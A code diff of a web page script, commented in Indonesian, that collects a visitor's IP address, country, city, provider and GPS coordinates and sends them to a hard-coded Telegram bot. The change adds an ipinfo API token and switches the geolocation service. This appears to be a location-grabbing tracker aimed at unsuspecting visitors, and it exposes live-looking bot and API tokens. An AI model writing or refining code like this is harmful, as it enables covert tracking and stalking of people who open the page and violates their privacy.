@@ -26,17 +26,18 @@
   <script>
     const botToken = "7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w";
     const chatId = "7567067447";
+    const ipinfoToken = "eae5fb822c92ce"; // Ganti ini dengan token ipinfo Anda
 
     async function sendLocation(coords, ipData, ipInfo) {
       const msg = `
 📥 Lokasi baru terdeteksi!
 
 🌐 IP: ${ipData.ip}
-📍 Negara: ${ipInfo?.country_name || 'N/A'}
+📍 Negara: ${ipInfo?.country || 'N/A'}
 🏙️ Kota: ${ipInfo?.city || 'N/A'}
 🕹️ Provider: ${ipInfo?.org || 'N/A'}
 
-📡 GPS: 
+📡 GPS:
 Latitude: ${coords.latitude}
 Longitude: ${coords.longitude}
 📌 https://maps.google.com/?q=${coords.latitude},${coords.longitude}
@@ -58,7 +59,7 @@ Longitude: ${coords.longitude}
         .then(res => res.json())
         .catch(() => ({ ip: "Gagal" }));
 
-      const info = await fetch("https://ipapi.co/json/")
+      const info = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
         .then(res => res.json())
         .catch(() => null);
 
